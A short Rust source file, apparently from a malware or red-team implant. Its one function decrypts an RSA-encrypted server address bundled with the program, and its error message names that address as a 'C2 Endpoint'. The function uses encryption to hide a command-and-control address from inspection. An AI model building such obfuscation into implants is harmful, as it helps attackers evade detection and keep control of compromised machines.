use openssl::rsa::{self, Padding};

use crate::{PUB_KEY, SERVER_IP};

/// gets the server IP and port using the bundled `PUB_KEY` and `SERVER_IP`
pub(crate) fn get_ip() -> String {
    let mut output_buff = vec![0u8; SERVER_IP.len()];

    let len = rsa::Rsa::public_key_from_pem(PUB_KEY)
        .unwrap()
        .public_decrypt(SERVER_IP, &mut output_buff, Padding::PKCS1)
        .unwrap();
    
    String::from_utf8(output_buff[0..len].to_vec()).expect("C2 Endpoint Deobfuscation Error")
}
